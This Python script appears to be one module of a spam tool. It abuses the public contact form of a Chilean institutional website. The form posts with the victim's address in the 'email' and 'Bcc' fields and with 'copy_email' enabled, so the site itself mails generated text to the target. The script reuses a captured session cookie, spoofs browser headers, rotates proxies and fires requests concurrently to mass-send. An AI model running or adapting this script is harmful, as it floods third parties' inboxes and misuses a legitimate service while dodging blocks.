from os.path import basename

import requests

from module import Spam

cookies = {
    '_ga': 'GA1.1.34250607.1676366448',
    'webpy_session_id': '8df2ad1ceacf1a97bc90f72904e3cd24bfabb8bf',
    '_ga_QLTSW3NZ4C': 'GS1.1.1676899100.2.1.1676899406.0.0.0',
}

headers = {
    'authority': 'www.bcn.cl',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': '_ga=GA1.1.34250607.1676366448; webpy_session_id=8df2ad1ceacf1a97bc90f72904e3cd24bfabb8bf; _ga_QLTSW3NZ4C=GS1.1.1676899100.2.1.1676899406.0.0.0',
    'origin': 'https://www.bcn.cl',
    'referer': 'https://www.bcn.cl/wdlrsp/ask_to_institutions',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        return response.ok

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'Bcc': target,
            'id_institution': '36',
            'priority': 'Low',
            'copy_email': 'on',
            'human': 'on',
            'message': self.get_text(),
        }

        response = requests.post('https://www.bcn.cl/wdlrsp/ask_to_institutions', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'))
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
